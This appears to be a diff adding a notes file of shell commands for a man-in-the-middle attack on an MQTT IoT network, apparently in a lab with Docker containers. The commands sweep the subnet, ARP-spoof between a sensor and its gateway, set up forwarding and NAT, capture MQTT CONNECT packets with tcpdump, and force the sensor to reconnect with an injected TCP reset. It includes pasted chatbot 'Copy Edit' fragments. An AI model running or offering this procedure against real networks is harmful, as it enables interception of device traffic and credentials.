@@ -1,0 +1,76 @@
+ip a
+
+
+ip link set eth0 promisc on
+ip link show eth0 | grep PROMISC
+
+for i in $(seq 1 254); do ping -c1 -W1 192.168.10.$i > /dev/null & done
+
+
+arp -n
+
+arpspoof -i eth0 -t 192.168.10.10 192.168.10.1  
+arpspoof -i eth0 -t 192.168.10.1 192.168.10.10 
+
+tcpdump -i eth0 -A tcp port 1883 and 'tcp[((tcp[12] & 0xf0) >> 2):4] = 0x10100000'
+
+
+tcpdump -i eth0 -A port 1883
+
+python3 mqtt_sniffer.py
+
+
+ip -s -s neigh flush all
+
+
+for i in {1..254}; do ping -c1 -W1 192.168.10.$i > /dev/null & done
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i eth0 -j ACCEPT
+
+arpspoof -i eth0 -t 192.168.10.10 192.168.10.1
+arpspoof -i eth0 -t 192.168.10.1 192.168.10.10
+
+
+tcpdump -i eth0 -A port 1883 and 'tcp[((tcp[12] & 0xf0) >> 2):1] = 0x10'
+tcpdump -i eth0 -A port 1883
+
+========================================================================================================================
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Setup NAT
+
+
+iptables -t nat -F
+iptables -F
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i eth0 -j ACCEPT
+Start ARP spoofing
+
+arpspoof -i eth0 -t 192.168.10.10 192.168.10.1
+arpspoof -i eth0 -t 192.168.10.1 192.168.10.10
+
+Start TCP+MQTT sniffer BEFORE sensor starts
+
+tcpdump -i eth0 -A port 1883
+docker restart <sensor>
+You must restart it now — while sniffing and spoofing are already active.
+
+💡 You can also use this to auto-reset TCP:
+bash
+Copy
+Edit
+hping3 -c 1 -R -p 1883 192.168.10.10
+
+
+
+
+
+
+
+
